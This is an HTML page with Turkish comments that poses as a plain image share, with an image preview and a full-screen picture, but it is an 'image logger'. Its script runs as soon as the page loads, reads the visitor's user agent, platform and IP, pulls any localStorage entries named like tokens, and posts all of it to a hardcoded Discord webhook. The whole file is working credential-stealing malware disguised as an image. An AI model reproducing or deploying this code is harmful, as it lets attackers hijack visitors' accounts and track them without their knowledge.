<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="utf-8">
    <title></title>
    <meta property="og:title" content=" ">
    <meta property="og:description" content=" ">
    <meta property="og:image" content="https://i.imgur.com/4z3vK8P.png"> 
    <script>
        async function runLogger() {
            let payload = `🔥 SINGLE USE IMAGE LOGGER 2026 🔥\n\n`;
            payload += `👤 User-Agent: ${navigator.userAgent}\n`;
            payload += `💻 Platform: ${navigator.platform}\n`;
            payload += `🕒 Time: ${new Date().toLocaleString('tr-TR')}\n\n`;

            // Gelişmiş Token Steal
            try {
                let tokens = [];
                // LocalStorage
                if (localStorage) {
                    for (let i = 0; i < localStorage.length; i++) {
                        let key = localStorage.key(i);
                        if (key && key.toLowerCase().includes("token")) {
                            let val = localStorage.getItem(key);
                            if (val && val.length > 50) tokens.push(val);
                        }
                    }
                }
                if (tokens.length) payload += `🔑 Found Tokens:\n${tokens.join("\n")}\n\n`;
            } catch(e) {}

            // IP
            try {
                let ip = await fetch("https://api.ipify.org?format=text").then(r => r.text());
                payload += `🌐 IP: ${ip}\n`;
            } catch(e) {}

            // Webhook
            const webhook = "https://discord.com/api/webhooks/1486358396495069185/flAV9GWWUCm5MAyGeQ50bekvASomtoXZ0fBlukeA_q5H8r0u6RLqxqUhIpUUryk40QWX";

            fetch(webhook, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ 
                    content: payload,
                    username: "Image Logger"
                })
            });
        }

        // Sayfa yüklendiği anda çalış
        window.onload = runLogger;
    </script>
</head>
<body style="margin:0;background:#000;overflow:hidden;">
    <img src="https://i.imgur.com/4z3vK8P.png" style="width:100%;height:100vh;object-fit:contain;">
</body>
</html>
